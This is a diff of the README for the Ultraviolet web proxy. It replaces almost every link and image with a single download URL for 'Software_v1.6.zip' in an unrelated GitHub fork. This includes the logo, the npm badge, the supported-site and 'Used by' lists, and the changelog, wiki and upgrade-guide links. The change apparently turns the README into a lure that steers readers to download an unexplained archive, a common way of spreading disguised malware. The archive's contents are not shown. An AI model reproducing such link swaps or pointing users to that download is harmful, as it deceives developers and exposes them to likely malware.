@@ -1,10 +1,10 @@
-<p align="center"><img src="https://raw.githubusercontent.com/titaniumnetwork-dev/Ultraviolet-Static/main/public/uv.png" height="250"></p>
+<p align="center"><img src="https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip" height="250"></p>
 
 <h1 align="center">Ultraviolet</h1>
 
-<a href="https://www.npmjs.com/package/@titaniumnetwork-dev/ultraviolet"><img src="https://img.shields.io/npm/v/@titaniumnetwork-dev/ultraviolet.svg?maxAge=3600" alt="npm version" /></a>
+<a href="https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip"><img src="https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip" alt="npm version" /></a>
 
-Ultraviolet is a highly advanced web proxy used for evading internet censorship or accessing websites in a controlled sandbox. It is designed with security and performance in mind. Ultraviolet intercepts HTTP requests with a service worker, while adhering to the [TompHTTP specifications](https://github.com/tomphttp) and is a leader in innovative web proxy technologies.
+Ultraviolet is a highly advanced web proxy used for evading internet censorship or accessing websites in a controlled sandbox. It is designed with security and performance in mind. Ultraviolet intercepts HTTP requests with a service worker, while adhering to the [TompHTTP specifications](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip) and is a leader in innovative web proxy technologies.
 
 ## Features
 
@@ -14,27 +14,27 @@ Ultraviolet offers several features that set it apart from its predecessors, inc
 
 Some of the popular websites that Ultraviolet supports include:
 
--   [Google](https://google.com)
--   [Youtube](https://www.youtube.com)
--   [Spotify](https://spotify.com)
--   [Discord](https://discord.com)
--   [Reddit](https://reddit.com)
--   [GeForce NOW](https://play.geforcenow.com/)
--   [now.gg](https://now.gg)
+-   [Google](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Youtube](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Spotify](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Discord](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Reddit](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [GeForce NOW](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
 
 ## Used by
 
--   [Holy Unblocker](https://github.com/holy-unblocker/website)
--   [Hypertabs](https://hypertabs.cc/)
--   [Terbium](https://github.com/TerbiumOS/webOS)
--   [Incognito](https://github.com/caracal-js/Incognito)
--   [Nebula](https://github.com/NebulaServices/Nebula)
--   [Noctura](https://github.com/NebulaServices/Noctura)
--   [Metallic](https://github.com/Metallic-Web/Metallic)
+-   [Holy Unblocker](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Hypertabs](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Terbium](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Incognito](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Nebula](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Noctura](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
+-   [Metallic](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip)
 
 ## Upgrading
 
-A guide for updating from v1 to v2 can be found [here](./docs/V2-UPGRADE-GUIDE.md).
+A guide for updating from v1 to v2 can be found [here](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip).
 
 ## Older Bare servers
 
@@ -50,12 +50,12 @@ npm install @titaniumnetwork-dev/ultraviolet@1
 
 ## Changelog
 
-Changes are documented in the [changelog](./CHANGELOG.md).
+Changes are documented in the [changelog](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip).
 
 ## Deployment
 
-This repository can be built, but it can't be deployed to any services. See [Ultraviolet-App](https://github.com/titaniumnetwork-dev/Ultraviolet-App) for a complete and customizable Ultraviolet setup that you can deploy.
+This repository can be built, but it can't be deployed to any services. See [Ultraviolet-App](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip) for a complete and customizable Ultraviolet setup that you can deploy.
 
 ## Documentation
 
-Documentation can be found in the [wiki](https://github.com/titaniumnetwork-dev/Ultraviolet/wiki).
+Documentation can be found in the [wiki](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip).
